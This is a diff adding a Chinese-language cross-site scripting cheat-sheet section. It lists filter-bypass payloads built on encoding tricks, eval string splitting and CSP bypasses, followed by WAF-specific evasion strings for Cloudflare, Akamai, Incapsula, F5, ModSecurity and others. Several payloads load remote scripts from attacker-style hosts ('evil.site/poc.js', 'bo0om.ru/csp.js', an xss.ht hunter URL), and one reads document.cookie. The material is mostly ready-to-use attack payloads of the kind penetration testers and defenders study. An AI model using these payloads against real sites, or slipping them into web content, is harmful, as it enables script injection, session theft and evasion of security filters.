@@ -494,6 +494,405 @@ trigger()
 </script x>
 ```
 
+### 过滤器绕过和外来有效负载
+
+绕过区分大小写
+```javascript
+<sCrIpt>alert(1)</ScRipt>
+```
+
+绕过标签黑名单
+```javascript
+<script x>
+<script x>alert('XSS')<script y>
+```
+
+通过代码评估绕过单词黑名单
+```javascript
+eval('ale'+'rt(0)');
+Function("ale"+"rt(1)")();
+new Function`al\ert\`6\``;
+setTimeout('ale'+'rt(2)');
+setInterval('ale'+'rt(10)');
+Set.constructor('ale'+'rt(13)')();
+Set.constructor`al\x65rt\x2814\x29```;
+```
+
+绕过不完整的HTML标签
+```javascript
+<img src='1' onerror='alert(0)' <
+```
+
+绕过字符串的引号
+```javascript
+String.fromCharCode(88,83,83)
+```
+
+绕过脚本标签中的引号
+```javascript
+http://localhost/bla.php?test=</script><script>alert(1)</script>
+<html>
+  <script>
+    <?php echo 'foo="text '.$_GET['test'].'";';`?>
+  </script>
+</html>
+```
+
+绕过mousedown事件中的引号
+```javascript
+<a href="" onmousedown="var name = '&#39;;alert(1)//'; alert('smthg')">Link</a>
+```
+
+.绕过
+```javascript
+<script>window['alert'](document['domain'])</script>
+
+IP地址转换成十进制格式
+http://192.168.1.1 == http://3232235777
+
+Base64编码
+<script>eval(atob("YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="))<script>
+```
+
+绕过字符串的括号
+```javascript
+alert`1`
+setTimeout`alert\u0028document.domain\u0029`;
+```
+
+绕过括号和分号
+```javascript
+<script>onerror=alert;throw 1337</script>
+<script>{onerror=alert}throw 1337</script>
+<script>throw onerror=alert,'some string',123,'haha'</script>
+<script>throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337]+a[13]</script>
+<script>TypeError.prototype.name ='=/',0[onerror=eval]['/-alert(1)//']</script>
+```
+
+绕过on黑名单
+```javascript
+<object onafterscriptexecute=confirm(0)>
+<object onbeforescriptexecute=confirm(0)>
+
+<img src='1' onerror\x00=alert(0) />
+<img src='1' onerror\x0b=alert(0) />
+
+<img src='1' onerror/=alert(0) />
+```
+
+绕过空格过滤
+```javascript
+<img/src='1'/onerror=alert(0)>
+
+<svgonload=alert(1)>
+
+$ echo "<svg^Lonload^L=^Lalert(1)^L>" | xxd
+00000000: 3c73 7667 0c6f 6e6c 6f61 640c 3d0c 616c  <svg.onload.=.al
+00000010: 6572 7428 3129 0c3e 0a                   ert(1).>.
+```
+
+绕过电子邮件过滤
+```javascript
+"><svg/onload=confirm(1)>"@x.y
+```
+
+绕过文档黑名单
+```javascript
+<div id = "x"></div><script>alert(x.parentNode.parentNode.parentNode.location)</script>
+window["doc"+"ument"]
+```
+
+绕过document.cookie黑名单
+```javascript
+window.cookieStore.get('COOKIE NAME').then((cookieValue)=>{alert(cookieValue.value);});
+```
+
+在字符串中使用JavaScript绕过
+```javascript
+<script>
+foo="text </script><script>alert(1)</script>";
+</script>
+```
+
+使用另一种重定向方式绕过
+```javascript
+location="http://ghostwolflab.com"
+document.location = "http://ghostwolflab.com"
+document.location.href="http://ghostwolflab.com"
+window.location.assign("http://ghostwolflab.com")
+window['location']['href']="http://ghostwolflab.com"
+```
+
+使用替代方式绕过
+```javascript
+window['alert'](0)
+parent['alert'](1)
+self['alert'](2)
+top['alert'](3)
+this['alert'](4)
+frames['alert'](5)
+content['alert'](6)
+
+[7].map(alert)
+[8].find(alert)
+[9].every(alert)
+[10].filter(alert)
+[11].findIndex(alert)
+[12].forEach(alert);
+```
+
+```javascript
+全局变量
+Object.keys()方法返回给定对象自己的属性名称的数组，其顺序与普通循环中的顺序相同.
+这意味着我们可以使用索引而不是函数名称来访问任何JavaScript函数.
+c=0; for(i in self) { if(i == "alert") { console.log(c); } c++; }
+// 5
+然后调用警报
+Object.keys(self)[5]
+// "alert"
+self[Object.keys(self)[5]]("1") // alert("1")
+使用正则表达找到alert
+a=()=>{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}}
+self[Object.keys(self)[a()]]("1") // alert("1")
+仅一行
+a=()=>{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}};self[Object.keys(self)[a()]]("1")
+```
+
+```javascript
+prompt`${document.domain}`
+document.location='java\tscript:alert(1)'
+document.location='java\rscript:alert(1)'
+document.location='java\tscript:alert(1)'
+```
+
+```javascript
+eval('ale'+'rt(0)');
+Function("ale"+"rt(1)")();
+new Function`al\ert\`6\``;
+
+constructor.constructor("aler"+"t(3)")();
+[].filter.constructor('ale'+'rt(4)')();
+
+top["al"+"ert"](5);
+top[8680439..toString(30)](7);
+top[/al/.source+/ert/.source](8);
+top['al\x65rt'](9);
+
+open('java'+'script:ale'+'rt(11)');
+location='javascript:ale'+'rt(12)';
+
+setTimeout`alert\u0028document.domain\u0029`;
+setTimeout('ale'+'rt(2)');
+setInterval('ale'+'rt(10)');
+Set.constructor('ale'+'rt(13)')();
+Set.constructor`al\x65rt\x2814\x29```;
+```
+
+```javascript
+使用替代方式绕过以触发警报
+var i = document.createElement("iframe");
+i.onload = function(){
+  i.contentWindow.alert(1);
+}
+document.appendChild(i);
+
+XSSObject.proxy = function (obj, name, report_function_name, exec_original) {
+      var proxy = obj[name];
+      obj[name] = function () {
+        if (exec_original) {
+          return proxy.apply(this, arguments);
+        }
+      };
+      XSSObject.lockdown(obj, name);
+  };
+XSSObject.proxy(window, 'alert', 'window.alert', false);
+```
+
+不使用任何东西绕过>
+```javascript
+<svg onload=alert(1)//
+```
+
+使用<>绕过<>
+```javascript
+Unicod 字符 U+FF1C 和 U+FF1E
+＜script/src=//evil.site/poc.js＞
+```
+
+绕过;使用另一个字符
+```javascript
+'te' * alert('*') * 'xt';
+'te' / alert('/') / 'xt';
+'te' % alert('%') % 'xt';
+'te' - alert('-') - 'xt';
+'te' + alert('+') + 'xt';
+'te' ^ alert('^') ^ 'xt';
+'te' > alert('>') > 'xt';
+'te' < alert('<') < 'xt';
+'te' == alert('==') == 'xt';
+'te' & alert('&') & 'xt';
+'te' , alert(',') , 'xt';
+'te' | alert('|') | 'xt';
+'te' ? alert('ifelsesh') : 'xt';
+'te' in alert('in') in 'xt';
+'te' instanceof alert('instanceof') instanceof 'xt';
+```
+
+使用HTML编码绕过
+```javascript
+%26%2397;lert(1)
+&#97;&#108;&#101;&#114;&#116;
+></script><svg onload=%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B(document.domain)>
+```
+
+使用ECMAScripy6绕过
+```javascript
+<script>alert&DiacriticalGrave;1&DiacriticalGrave;</script>
+```
+
+使用八进制编码绕过
+```javascript
+javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76'
+```
+
+使用UTF-7绕过
+```javascript
++ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-
+```
+
+使用UTF-8绕过
+```javascript
+< = %C0%BC = %E0%80%BC = %F0%80%80%BC
+> = %C0%BE = %E0%80%BE = %F0%80%80%BE
+' = %C0%A7 = %E0%80%A7 = %F0%80%80%A7
+" = %C0%A2 = %E0%80%A2 = %F0%80%80%A2
+" = %CA%BA
+' = %CA%B9
+```
+
+使用UTF-16be绕过
+```javascript
+%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E%00
+\x00<\x00s\x00v\x00g\x00/\x00o\x00n\x00l\x00o\x00a\x00d\x00=\x00a\x00l\x00e\x00r\x00t\x00(\x00)\x00>
+```
+
+使用UTF-32绕过
+```javascript
+%00%00%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E
+```
+
+BOM绕过
+```javascript
+BOM Character for UTF-16 Encoding:
+Big Endian : 0xFE 0xFF
+Little Endian : 0xFF 0xFE
+XSS : %fe%ff%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E
+
+BOM Character for UTF-32 Encoding:
+Big Endian : 0x00 0x00 0xFE 0xFF
+Little Endian : 0xFF 0xFE 0x00 0x00
+XSS : %00%00%fe%ff%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E
+```
+
+使用奇怪的编码或本机解释绕过
+```javascript
+<script>\u0061\u006C\u0065\u0072\u0074(1)</script>
+<img src="1" onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;" />
+<iframe src="javascript:%61%6c%65%72%74%28%31%29"></iframe>
+```
+
+Google Jsonp绕过CSP
+```javascript
+<script/src=//google.com/complete/search?client=chrome%26jsonp=alert(1);>"
+```
+
+绕过CSP
+```javascript
+//适用于Content-Security-Policy: default-src 'self' 'unsafe-inline';
+script=document.createElement('script');
+script.src='//bo0om.ru/csp.js';
+window.frames[0].document.head.appendChild(script);
+
+//使用inline和eval绕过CSP
+d=document;f=d.createElement("iframe");f.src=d.querySelector('link[href*=".css"]').href;d.body.append(f);s=d.createElement("script");s.src="https://[YOUR_XSSHUNTER_USERNAME].xss.ht";setTimeout(function(){f.contentWindow.document.head.append(s);},1000)
+
+//适用于script-src self
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+
+//适用于script-src 'self' data:
+<script src="data:,alert(1)">/</script>
+```
+
+### 常见WAF绕过
+
+```javascript
+Cloudflare
+<svg/onrandom=random onload=confirm(1)>
+<video onnull=null onmouseover=confirm(1)>
+<svg/OnLoad="`${prompt``}`">
+<svg/onload=%26nbsp;alert`bohdan`+
+1'"><img/src/onerror=.1|alert``>
+<svg onload=prompt%26%230000000040document.domain)>
+<svg onload=prompt%26%23x000000028;document.domain)>
+xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
+<svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
+<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>
+
+Chrome
+</script><svg><script>alert(1)-%26apos%3B
+
+Incapsula
+anythinglr00</script><script>alert(document.domain)</script>uxldz
+anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
+<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
+<svg onload\r\n=$.globalEval("al"+"ert()");>
+
+Akamai
+?"></script><base%20c%3D=href%3Dhttps:\mysite>
+<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
+1%3C/script%3E%3Csvg/onload=prompt(document[domain])%3E
+<SCr%00Ipt>confirm(1)</scR%00ipt>
+
+WordFence
+<a href=javas&#99;ript:alert(1)>
+
+Fortiweb
+\u003e\u003c\u0068\u0031 onclick=alert('1')\u003e
+
+F5 Big IP
+<body style="height:1000px" onwheel="[DATA]">
+<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="[DATA]">
+<body style="height:1000px" onwheel="[JS-F**k Payload]">
+<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="[JS-F**k Payload]">
+<body style="height:1000px" onwheel="prom%25%32%33%25%32%36x70;t(1)">
+<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="prom%25%32%33%25%32%36x70;t(1)">
+
+Barracuda
+<body style="height:1000px" onwheel="alert(1)">
+<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">
+
+PHP-IDS
+<svg+onload=+"[DATA]"
+<svg+onload=+"aler%25%37%34(1)"
+
+Mod-Security
+<a href="j[785 bytes of (&NewLine;&Tab;)]avascript:alert(1);">XSS</a>
+1⁄4script3⁄4alert(¢xss¢)1⁄4/script3⁄4
+<b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover=alert(1)>
+
+Quick Defense
+<input type="search" onsearch="aler\u0074(1)">
+<details ontoggle="aler\u0074(1)">
+
+Sucuri
+1⁄4script3⁄4alert(¢xss¢)1⁄4/script3⁄4
+
+AndularJS
+{{constructor.constructor(alert 1 )()}} 
+```
+
+
+
 ### 编码
 
 |HTML|Char|数字|十六进制|CSS (ISO)|JS (八进制)|URL编码|
